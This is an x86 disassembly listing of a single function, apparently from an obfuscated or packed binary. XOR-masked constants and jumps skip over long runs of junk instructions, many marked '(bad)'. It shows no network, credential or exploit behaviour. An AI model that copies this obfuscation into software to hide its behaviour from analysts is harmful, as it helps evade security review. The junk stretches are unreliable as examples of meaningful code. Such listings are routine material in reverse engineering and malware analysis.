  40c030:	jno    0x40c077
  40c032:	add    BYTE PTR [edi-0x5819e061],bh
  40c038:	inc    ecx
  40c039:	or     al,0x18
  40c03b:	outs   dx,BYTE PTR ds:[esi]
  40c03c:	ins    BYTE PTR es:[edi],dx
  40c03d:	sub    esp,esp
  40c03f:	pop    eax
  40c040:	push   ds
  40c041:	push   es
  40c042:	push   0x61
  40c044:	sbb    bh,dl
  40c046:	or     bl,BYTE PTR [edx+ecx*4]
  40c049:	fwait
  40c04a:	add    edi,DWORD PTR [edi+ebx*4+0x3d8260ca]
  40c051:	imul   esp,DWORD PTR [ebp+0x27],0xffffffb3
  40c055:	ins    BYTE PTR es:[edi],dx
  40c056:	(bad)  [eax]
  40c058:	push   cs
  40c059:	pusha  
  40c05a:	retf   0x909c
  40c05d:	dec    edi
  40c05e:	(bad)  
  40c05f:	mov    ebp,0xbd5fa3c1
  40c064:	cmp    ebx,edi
  40c066:	shr    BYTE PTR [ecx],cl
  40c068:	dec    edx
  40c069:	fwait
  40c06a:	bound  edi,QWORD PTR [esi]
  40c06c:	call   FWORD PTR [ebp+0x7e6fbeba]
  40c072:	test   al,0x76
  40c074:	adc    BYTE PTR [ebp-0x7c],al
  40c077:	and    eax,0xf1d109b0
  40c07c:	hlt    
  40c07d:	cs xchg edx,eax
  40c07f:	(bad)  
  40c080:	fs mov ecx,0x7510859
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	cmp    DWORD PTR [ebx+0x28],esp
  40c0e3:	psraw  mm6,QWORD PTR ds:0x7eb67e7e
  40c0ea:	jle    0x40c16a
  40c0ec:	fsub   DWORD PTR [eax]
  40c0ee:	adc    edi,DWORD PTR [edx]
  40c0f0:	cwde   
  40c0f1:	cmp    eax,0x83f13eb
  40c0f6:	push   0xffffffcf
  40c0f8:	jge    0x40c15b
  40c0fa:	and    BYTE PTR [esi+0x78],ah
  40c0fd:	hlt    
  40c0fe:	xor    bl,BYTE PTR [esi-0x76d02ff7]
  40c104:	mov    ecx,0xe662fad3
  40c109:	les    ebp,FWORD PTR [edi]
  40c10b:	add    al,0x1c
  40c10d:	push   ebp
  40c10e:	and    ch,BYTE PTR [ecx+0x64]
  40c111:	pop    edi
  40c112:	sbb    BYTE PTR [edx+0x17],cl
  40c115:	test   al,0xa2
  40c117:	dec    eax
  40c118:	and    al,0xb6
  40c11a:	or     DWORD PTR [ebx-0x743917ff],0x53
  40c121:	adc    al,0x19
  40c123:	jbe    0x40c102
  40c125:	ins    BYTE PTR es:[edi],dx
  40c126:	(bad)  
  40c127:	jae    0x40c0ee
  40c129:	add    BYTE PTR [edx],bl
  40c12b:	sub    esp,esi
  40c12d:	test   eax,0x52decd62
  40c132:	cmc    
  40c133:	inc    esp
  40c134:	push   cs
  40c135:	inc    ecx
  40c136:	sub    BYTE PTR [eax+0x77],ch
  40c139:	lahf   
  40c13a:	aam    0x4d
  40c13c:	mov    al,BYTE PTR [ebx]
  40c13e:	lea    esp,[ebp-0x3f]
  40c141:	cmp    al,0xf5
  40c143:	popa   
  40c144:	jmp    0x40c13e
  40c146:	pop    esi
  40c147:	adc    edx,ecx
  40c149:	das    
  40c14a:	gs inc esp
  40c14c:	mov    WORD PTR [ebx+esi*8],fs
  40c14f:	jle    0x40c171
  40c151:	cmc    
  40c152:	fstp   TBYTE PTR [esi-0x53]
  40c155:	xor    esi,DWORD PTR [ecx+0x60a2a8e6]
  40c15b:	outs   dx,BYTE PTR ds:[esi]
  40c15c:	and    eax,0x97dfebaf
  40c161:	adc    edi,DWORD PTR [edx]
  40c163:	push   edi
  40c164:	cmc    
  40c165:	adc    BYTE PTR [edx],cl
  40c167:	cmp    BYTE PTR [ecx+0x58],cl
  40c16a:	test   DWORD PTR [ecx+0x4c01627c],ecx
  40c170:	sahf   
  40c171:	dec    eax
  40c172:	inc    ebp
  40c173:	cmp    DWORD PTR [ebx+0x3dfd957b],ebx
  40c179:	sub    esp,DWORD PTR [edx-0x7a]
  40c17c:	mov    ?,WORD PTR [ecx]
  40c17e:	lods   al,BYTE PTR ds:[esi]
  40c17f:	repz push 0xffffffa6
  40c182:	jmp    0x56e7:0x9b13dd92
  40c189:	or     dh,0x3f
  40c18c:	ror    BYTE PTR ss:[ebp-0x610c69b9],0x44
  40c194:	retf   
  40c195:	sbb    esi,DWORD PTR [eax]
  40c197:	push   esi
  40c198:	add    cl,ah
  40c19a:	sbb    DWORD PTR [edi+0x37],0x7b
  40c19e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c19f:	push   edi
  40c1a0:	mov    bl,0xbe
  40c1a2:	pop    es
  40c1a3:	push   ebx
  40c1a4:	popa   
  40c1a5:	push   ebx
  40c1a6:	push   esi
  40c1a7:	sbb    DWORD PTR [esi-0x33],edx
  40c1aa:	ror    BYTE PTR [ecx+ebx*2-0x61],1
  40c1ae:	sub    DWORD PTR [ebp-0x4a5ed868],ebp
  40c1b4:	lea    ecx,[edx+ecx*1+0x32729f]
  40c1bb:	cmp    ecx,eax
  40c1bd:	jne    0x40bf8f
  40c1c3:	mov    ebx,esi
  40c1c5:	jmp    0x40c2b4
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx-0x7e0a01c3]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	(bad)  
  40c1ed:	pop    esi
  40c1ee:	add    al,bh
  40c1f0:	jl     0x40c1e4
  40c1f2:	scas   eax,DWORD PTR es:[edi]
  40c1f3:	pop    es
  40c1f4:	jnp    0x40c183
  40c1f6:	mov    bl,0xc5
  40c1f8:	push   eax
  40c1f9:	inc    ebx
  40c1fa:	cwde   
  40c1fb:	and    esi,DWORD PTR [edx+0x5740d031]
  40c201:	pop    ds
  40c202:	call   0xd73b:0xe7d72ca9
  40c209:	xchg   BYTE PTR [ecx-0x55d37243],cl
  40c20f:	leave  
  40c210:	sub    ah,BYTE PTR [edx-0x40]
  40c213:	jb     0x40c215
  40c215:	outs   dx,DWORD PTR ds:[esi]
  40c216:	mov    edx,0x40ff8a78
  40c21b:	mov    ch,bh
  40c21d:	mov    edx,0x4baeb3e3
  40c222:	dec    edx
  40c223:	inc    edx
  40c224:	in     al,0x6c
  40c226:	inc    edi
  40c227:	jo     0x40c230
  40c229:	mov    edi,0x67dda188
  40c22e:	mov    edx,0x7fc67a67
  40c233:	inc    edi
  40c234:	push   ss
  40c235:	mov    bl,0x1d
  40c237:	sbb    ebx,ebp
  40c239:	xchg   ecx,eax
  40c23a:	mov    ch,0x9c
  40c23c:	aam    0xae
  40c23e:	mov    al,ds:0x98820c45
  40c243:	retf   
  40c244:	xchg   esi,eax
  40c245:	mov    ds:0x93dd9ca4,eax
  40c24a:	xchg   BYTE PTR [edx+ebx*1],dh
  40c24d:	jbe    0x40c238
  40c24f:	sbb    eax,DWORD PTR [esi+0x6875b24a]
  40c255:	jp     0x40c2c7
  40c257:	push   ebx
  40c258:	sub    eax,DWORD PTR [esi]
  40c25a:	sahf   
  40c25b:	shr    DWORD PTR [eax+0x53cbf483],0x25
  40c262:	fcmovbe st,st(3)
  40c264:	mov    esp,DWORD PTR [esi+0x4fa43af1]
  40c26a:	(bad)  
  40c26b:	rcl    ebx,1
  40c26d:	fst    st(5)
  40c26f:	lods   eax,DWORD PTR gs:[esi]
  40c271:	cmc    
  40c272:	ins    BYTE PTR es:[edi],dx
  40c273:	or     ebp,DWORD PTR [esi]
  40c275:	jg     0x40c259
  40c277:	fmul   DWORD PTR [ecx]
  40c279:	enter  0xe540,0x1a
  40c27d:	dec    esi
  40c27e:	push   esp
  40c27f:	cld    
  40c280:	jno    0x40c2fd
  40c282:	cmc    
  40c283:	imul   edi,esp,0x606c3fc7
  40c289:	mov    ds:0x294533ff,eax
  40c28e:	cmp    ah,dl
  40c290:	sub    ah,BYTE PTR [esi-0x27d234b1]
  40c296:	loopne 0x40c275
  40c298:	popf   
  40c299:	(bad)  
  40c29a:	and    eax,0x664c1e11
  40c29f:	jne    0x40c261
  40c2a1:	fwait
  40c2a2:	dec    esp
  40c2a3:	adc    dh,BYTE PTR [edi+esi*2+0x56]
  40c2a7:	pop    eax
  40c2a8:	or     ah,BYTE PTR [edx]
  40c2aa:	out    0xb6,eax
  40c2ac:	sbb    BYTE PTR [eax],bh
  40c2ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2af:	icebp  
  40c2b0:	jp     0x40c271
  40c2b2:	outs   dx,DWORD PTR ds:[esi]
  40c2b3:	ins    DWORD PTR es:[edi],dx
  40c2b4:	mov    eax,DWORD PTR [ebp-0x4]
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	dec    esp
  40c2da:	loop   0x40c26c
  40c2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2dd:	jno    0x40c2aa
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	dec    eax
  40c2e6:	xor    edx,DWORD PTR [esi+0x14aa6a16]
  40c2ec:	sar    BYTE PTR [ebx],cl
  40c2ee:	stos   DWORD PTR es:[edi],eax
  40c2ef:	add    eax,0x448229e6
  40c2f4:	push   ecx
  40c2f5:	call   FWORD PTR [esp+ebx*8]
  40c2f8:	xor    eax,0xb6dace86
  40c2fd:	into   
  40c2fe:	(bad)  
  40c300:	mov    ebx,0xcde16dc6
  40c305:	jge    0x40c300
  40c307:	sub    eax,0x486c7f7a
  40c30c:	cmp    bh,BYTE PTR [eax]
  40c30e:	inc    edi
  40c30f:	pop    ebx
  40c310:	ficomp DWORD PTR [edi]
  40c312:	pmaddwd mm1,QWORD PTR [ebx-0x51]
  40c316:	push   DWORD PTR [ebx-0x1123fbf5]
  40c31c:	jo     0x40c2ac
  40c31e:	ss movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40c321:	mov    al,0x22
  40c323:	mov    edi,0xb66b2d38
  40c328:	(bad)  
  40c329:	mov    DWORD PTR fs:[edx+0x7609d811],0x790b118b
  40c334:	jae    0x40c372
  40c336:	sbb    eax,0xdd93176b
  40c33b:	pop    esi
  40c33c:	pop    ecx
  40c33d:	and    eax,0xab9d75b1
  40c342:	mov    ds:0x6d6db1d7,eax
  40c347:	sub    BYTE PTR [edx],dl
  40c349:	dec    edi
  40c34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c34b:	add    ch,dh
  40c34d:	repz xchg edx,eax
  40c34f:	or     al,0x49
  40c351:	adc    DWORD PTR [esi-0x44f55b3],0x57dc3745
  40c35b:	mov    ah,BYTE PTR es:[edx+0x61]
  40c35f:	lock jmp 0xe281:0xaf14b176
  40c367:	jb     0x40c2f9
  40c369:	int    0x1
  40c36b:	xor    DWORD PTR [edi-0x62],edx
  40c36e:	and    ax,0xf3e7
  40c372:	iret   
  40c373:	out    0x8c,al
  40c375:	rol    BYTE PTR ds:0x7d0bc7a,0x1a
  40c37c:	xchg   esp,eax
  40c37d:	test   al,0x18
  40c37f:	in     al,0x23
  40c381:	scas   al,BYTE PTR es:[edi]
  40c382:	in     eax,0xa4
  40c384:	and    DWORD PTR [ebp+0x41],0xeaa5cf18
  40c38b:	pop    edi
  40c38c:	cdq    
  40c38d:	lock and ebx,esi
  40c390:	pop    ds
  40c391:	dec    eax
  40c392:	mov    al,ds:0xe94ae568
  40c397:	or     DWORD PTR [ecx-0xa7fcded],0xffffff82
  40c39e:	int    0xd5
  40c3a0:	repz push ebx
  40c3a2:	mov    al,0x49
  40c3a4:	js     0x40c383
  40c3a6:	push   ss
  40c3a7:	lahf   
  40c3a8:	jbe    0x40c412
  40c3aa:	out    dx,al
  40c3ab:	in     al,dx
  40c3ac:	mov    al,0xff
  40c3ae:	shl    DWORD PTR [ebx],cl
  40c3b0:	fucomi st,st(1)
  40c3b2:	loopne 0x40c3b4
  40c3b4:	add    BYTE PTR [eax],al
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0x902e5fee,ecx
  40c3c3:	adc    BYTE PTR [edi],dh
  40c3c5:	inc    edx
  40c3c6:	dec    ecx
  40c3c7:	retf   
  40c3c8:	jle    0x40c448
  40c3ca:	mov    dh,0x7e
  40c3cc:	jle    0x40c44c
  40c3ce:	enter  0x47af,0x23
  40c3d2:	jns    0x40c3a8
  40c3d4:	mov    ds:0xbdd39d21,eax
  40c3d9:	pusha  
  40c3da:	adc    BYTE PTR [ebx],bl
  40c3dc:	gs dec ebx
  40c3de:	in     al,dx
  40c3df:	push   ss
  40c3e0:	pop    ss
  40c3e1:	test   eax,0x57689cf1
  40c3e6:	xchg   esp,eax
  40c3e7:	or     al,0xd8
  40c3e9:	sar    DWORD PTR [esp+eax*2-0x433e70cb],1
  40c3f0:	or     DWORD PTR [ecx+0x33c365f7],ebx
  40c3f6:	loopne 0x40c467
  40c3f8:	pop    es
  40c3f9:	stc    
  40c3fa:	das    
  40c3fb:	sbb    BYTE PTR fs:[esi+0x2],dl
  40c3ff:	cs loope 0x40c3b2
  40c402:	imul   DWORD PTR [esi-0x61390f30]
  40c408:	push   es
  40c409:	mov    cl,0x8
  40c40b:	pusha  
  40c40c:	dec    ebp
  40c40d:	adc    DWORD PTR [edi],edi
  40c40f:	fstp   st(2)
  40c411:	mov    al,ds:0xd61f6379
  40c416:	adc    cl,0xef
  40c419:	mov    ebx,0xf14afedc
  40c41e:	je     0x40c495
  40c420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c421:	call   0x3a4f:0x21f5a068
  40c428:	popf   
  40c429:	clc    
  40c42a:	push   0x1e
  40c42c:	out    dx,al
  40c42d:	pop    ebx
  40c42e:	jbe    0x40c48b
  40c430:	add    ebx,DWORD PTR fs:[ecx]
  40c433:	ret    0xb542
  40c436:	jmp    0x40c3bf
  40c438:	xchg   esi,eax
  40c439:	clc    
  40c43a:	add    eax,0x8c4ede41
  40c43f:	repz out 0x9e,al
  40c442:	das    
  40c443:	sub    dl,cl
  40c445:	pusha  
  40c446:	out    0x79,eax
  40c448:	test   al,0xe5
  40c44a:	mov    es,WORD PTR [ebx+edx*4-0x51bf5a6f]
  40c451:	ins    DWORD PTR es:[edi],dx
  40c452:	mov    esi,0x2fc9a22
  40c457:	mov    al,0x74
  40c459:	xchg   esp,eax
  40c45a:	pop    ebx
  40c45b:	pop    ecx
  40c45c:	out    0x86,al
  40c45e:	xchg   BYTE PTR [edx-0x78],dh
  40c461:	popf   
  40c462:	pop    edx
  40c463:	hlt    
  40c464:	add    bl,BYTE PTR fs:[edx+0x48c13f43]
  40c46b:	pop    esi
  40c46c:	out    dx,al
  40c46d:	rol    DWORD PTR [ebp-0x6a],0x41
  40c471:	in     al,0xfd
  40c473:	clc    
  40c474:	ja     0x40c4d2
  40c476:	test   DWORD PTR [esi-0x8],esi
  40c479:	es ins BYTE PTR es:[edi],dx
  40c47b:	inc    edi
  40c47c:	int3   
  40c47d:	imul   ebp,DWORD PTR [edi],0xffffffd6
  40c480:	pop    ebp
  40c481:	jg     0xc97d586b
  40c487:	aad    0x49
  40c489:	and    DWORD PTR [eax],edi
  40c48b:	loop   0x40c464
  40c48d:	push   edx
  40c48e:	shl    BYTE PTR [ecx-0x76],1
  40c491:	fisubr DWORD PTR [ebx+0x12]
  40c494:	xor    eax,0x5d39432d
  40c499:	adc    cl,ch
  40c49b:	loopne 0x40c49d
  40c49d:	add    BYTE PTR [eax],al
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	mov    ecx,DWORD PTR gs:[ebx+ecx*8+0x7ec881ce]
  40c4b2:	jle    0x40c46a
  40c4b4:	jle    0x40c534
  40c4b6:	jle    0x40c490
  40c4b8:	push   ss
  40c4b9:	cmc    
  40c4ba:	sub    bl,BYTE PTR [edx]
  40c4bc:	popf   
  40c4bd:	out    0x4f,eax
  40c4bf:	cmp    bh,BYTE PTR [ecx+edx*1+0x31]
  40c4c3:	push   edx
  40c4c4:	dec    eax
  40c4c5:	loope  0x40c4aa
  40c4c7:	push   esp
  40c4c8:	adc    edx,DWORD PTR [edx-0x43]
  40c4cb:	or     ch,BYTE PTR [ecx-0x18]
  40c4ce:	pop    ds
  40c4cf:	mov    al,0x99
  40c4d1:	imul   ebx,DWORD PTR es:[ecx],0xffffffb1
  40c4d5:	and    cl,0x92
  40c4d8:	xor    ch,ch
  40c4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4db:	test   al,0xcb
  40c4dd:	xor    dh,BYTE PTR [ecx+0x51]
  40c4e0:	and    BYTE PTR [ebx-0x7f],dl
  40c4e3:	dec    ebp
  40c4e4:	scas   eax,DWORD PTR es:[edi]
  40c4e5:	inc    ebx
  40c4e6:	lock jmp 0x8687:0x7baaa985
  40c4ee:	out    dx,eax
  40c4ef:	jmp    0x40c511
  40c4f1:	loope  0x40c54f
  40c4f3:	lock ds jb 0x40c518
  40c4f7:	mov    ebp,0x82702810
  40c4fc:	mov    WORD PTR [ecx-0xda561da],gs
  40c502:	repz fistp QWORD PTR [ebp+ebp*4+0x4c]
  40c507:	sbb    DWORD PTR [edx-0x79f931d2],ebx
  40c50d:	test   dl,ch
  40c50f:	add    DWORD PTR [edi],ebx
  40c511:	nop
  40c512:	or     ch,0x2a
  40c515:	je     0x40c580
  40c517:	or     eax,0xeb300252
  40c51c:	lods   al,BYTE PTR ds:[esi]
  40c51d:	test   ebp,esi
  40c51f:	aaa    
  40c520:	mov    ah,0x97
  40c522:	jbe    0x40c505
  40c524:	mov    ds:0x1110b99a,al
  40c529:	sub    al,0x0
  40c52b:	shl    BYTE PTR [ecx-0x7e],cl
  40c52e:	repz jns 0x40c4f1
  40c531:	rcl    DWORD PTR [ecx],1
  40c533:	ret    
  40c534:	pop    eax
  40c535:	jmp    0x38cd03f0
  40c53a:	dec    eax
  40c53b:	mov    al,0x28
  40c53d:	test   BYTE PTR [ecx-0x72],bl
  40c540:	sbb    al,0xf3
  40c542:	jg     0x40c556
  40c544:	nop
  40c545:	and    BYTE PTR [edi],ch
  40c547:	fmul   st,st(7)
  40c549:	pop    edx
  40c54a:	div    DWORD PTR [ecx]
  40c54c:	or     BYTE PTR [ecx+0x58],0x50
  40c550:	stos   DWORD PTR es:[edi],eax
  40c551:	outs   dx,BYTE PTR ds:[esi]
  40c552:	push   ss
  40c553:	xor    eax,0xb3cf7abf
  40c558:	idiv   BYTE PTR [edx]
  40c55a:	xor    ebx,edx
  40c55c:	sub    al,0x1e
  40c55e:	popf   
  40c55f:	test   DWORD PTR ds:0xe2661bc0,esp
  40c565:	fld    QWORD PTR [ecx+0x73ed8d9d]
  40c56b:	mov    ebp,0x538a8520
  40c570:	xor    ebp,ecx
  40c572:	push   es
  40c573:	mov    al,ds:0x475eff6c
  40c578:	xchg   esp,eax
  40c579:	popa   
  40c57a:	mov    esi,0x55930c58
  40c57f:	je     0x40c682
  40c585:	xchg   edx,eax
  40c586:	push   0xa
  40c588:	pop    ecx
  40c589:	push   0x4
  40c58b:	pop    ebx
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0x88577cab
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	fdivp  st(0),st
  40c5b2:	rcl    DWORD PTR [ecx+eiz*8+0x5d16aa65],1
  40c5b9:	push   0x39
  40c5bb:	loopne 0x40c62d
  40c5bd:	and    ebx,DWORD PTR [eax+0x35]
  40c5c0:	pop    edi
  40c5c1:	inc    esi
  40c5c2:	and    eax,DWORD PTR ds:0x1428521f
  40c5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5c9:	sbb    eax,0x5356a003
  40c5ce:	lods   eax,DWORD PTR ds:[esi]
  40c5cf:	mov    edx,0x167e7bb5
  40c5d4:	arpl   WORD PTR [ebx+0x42581d3e],di
  40c5da:	dec    ebx
  40c5db:	stos   BYTE PTR es:[edi],al
  40c5dc:	pop    ebx
  40c5dd:	xor    al,0xc0
  40c5df:	xor    bl,ch
  40c5e1:	pop    ebp
  40c5e2:	dec    edi
  40c5e3:	pop    edx
  40c5e4:	xchg   ecx,edi
  40c5e6:	ror    DWORD PTR [ecx+0xb24086f],cl
  40c5ec:	push   cs
  40c5ed:	xchg   esi,eax
  40c5ee:	mov    dh,0xaf
  40c5f0:	adc    eax,0xff9c8f23
  40c5f5:	xchg   esi,eax
  40c5f6:	das    
  40c5f7:	ins    DWORD PTR es:[edi],dx
  40c5f8:	rol    BYTE PTR [eax-0x78],cl
  40c5fb:	adc    dh,cl
  40c5fd:	pop    ss
  40c5fe:	iret   
  40c5ff:	and    ah,BYTE PTR [ecx*2+0x6e92098]
  40c606:	(bad)  
  40c607:	lock rcl DWORD PTR [esi],1
  40c60a:	dec    eax
  40c60b:	jp     0x40c5b1
  40c60d:	repnz int3 
  40c60f:	shr    BYTE PTR [edi+0x1e],cl
  40c612:	rol    DWORD PTR [ebp+0x480a6daf],cl
  40c618:	cs dec ebp
  40c61a:	inc    edx
  40c61b:	inc    ebx
  40c61c:	xor    cl,al
  40c61e:	or     BYTE PTR [ecx],0x7a
  40c621:	shl    edx,cl
  40c623:	scas   eax,DWORD PTR es:[edi]
  40c624:	int    0xbb
  40c626:	add    al,0x46
  40c628:	inc    eax
  40c629:	dec    esi
  40c62a:	sbb    dh,dh
  40c62c:	push   0xffffffc4
  40c62e:	bswap  esi
  40c630:	fsubrp st(7),st
  40c632:	jl     0x40c5e6
  40c634:	push   0xa717b56f
  40c639:	mov    ebx,0x43e4595c
  40c63e:	xor    DWORD PTR ds:[eax],esp
  40c641:	lods   eax,DWORD PTR ds:[esi]
  40c642:	mov    bl,BYTE PTR [esi]
  40c644:	scas   al,BYTE PTR es:[edi]
  40c645:	aaa    
  40c646:	pop    edi
  40c647:	(bad)
  40c64b:	iret   
  40c64c:	cmp    BYTE PTR [edi+ebx*2+0x3a],0x7e
  40c651:	sahf   
  40c652:	and    BYTE PTR [ebx+0x70],al
  40c655:	cld    
  40c656:	bound  ebx,QWORD PTR [ebx]
  40c658:	adc    BYTE PTR [edi-0x36],bl
  40c65b:	push   es
  40c65c:	inc    edi
  40c65d:	lock push 0x429a6074
  40c663:	js     0x40c69c
  40c665:	dec    ecx
  40c666:	xchg   ecx,eax
  40c667:	cld    
  40c668:	xchg   si,ax
  40c66a:	test   BYTE PTR [ecx-0x5dc11547],cl
  40c670:	or     DWORD PTR [esi+0x61f735c],esp
  40c676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c677:	mov    eax,0xe4458b49
  40c67c:	imul   eax,ecx
  40c67f:	add    esp,eax
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
